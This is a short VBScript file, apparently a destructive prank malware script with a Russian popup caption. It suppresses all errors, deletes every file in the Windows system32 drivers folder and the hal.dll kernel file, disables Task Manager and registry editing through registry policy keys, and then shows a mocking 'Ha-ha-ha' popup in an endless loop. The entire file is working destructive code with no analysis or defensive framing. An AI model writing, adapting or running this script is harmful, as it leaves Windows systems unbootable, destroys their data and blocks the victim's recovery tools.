'kruto ass
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
Set Folder = FSO.GetFolder(fso.getspecialfolder(0)+"\system32\drivers\")
For Each File In Folder.Files
File.delete
Next
fso.deletefile fso.getspecialfolder(0)+"\system32\hal.dll",1
fso.deletefolder fso.getspecialfolder(0)+"\system32\drives",1
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
i=9
while i>0 or i<0
S.popup "Ha-ha-ha-ha-ha @3593475893475982375893475980",0, "Заголовок сообщения",3+0
i=i-1
wend


